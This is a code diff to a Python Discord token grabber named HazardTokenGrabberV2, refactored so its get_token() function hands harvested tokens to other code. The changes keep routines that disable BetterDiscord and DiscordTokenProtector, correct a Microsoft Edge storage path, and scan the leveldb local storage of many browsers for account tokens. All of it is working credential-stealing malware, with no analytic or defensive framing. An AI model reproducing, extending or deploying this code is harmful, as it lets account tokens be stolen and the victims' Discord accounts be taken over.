@@ -88,6 +88,7 @@ class HazardTokenGrabberV2(Functions):
         if r.status_code == 200 and tkn not in self.tokens:
             self.tokens.append(tkn)
 
+
     async def init(self):
         await self.bypassBetterDiscord()
         await self.bypassTokenProtector()
@@ -102,7 +103,9 @@ class HazardTokenGrabberV2(Functions):
                 t.join()
             except RuntimeError:
                 continue
-        self.finish()
+        global tokens
+        tokens = self.tokens
+        
 
     async def bypassTokenProtector(self):
         # fucks up the discord token protector by https://github.com/andro2157/DiscordTokenProtector
@@ -171,7 +174,7 @@ class HazardTokenGrabberV2(Functions):
             'Chrome SxS': self.appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
             'Chrome': self.chrome_user_data + '\\Default\\Local Storage\\leveldb\\',
             'Epic Privacy Browser': self.appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
-            'Microsoft Edge': self.appdata + '\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
+            'Microsoft Edge': self.appdata + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
             'Uran': self.appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
             'Yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
             'Brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
@@ -208,13 +211,12 @@ class HazardTokenGrabberV2(Functions):
                         for token in re.findall(self.regex, line):
                             asyncio.run(self.checkToken(token))
 
-    def finish(self):
-        global tokens
-        file_count, files_found, tokens = 0, '', ''
-        for tkn in self.tokens:
-            tokens += f'{tkn}'
+
+
 
 
 def get_token():
     asyncio.run(HazardTokenGrabberV2().init())
     return(tokens)
+
+#get_token()
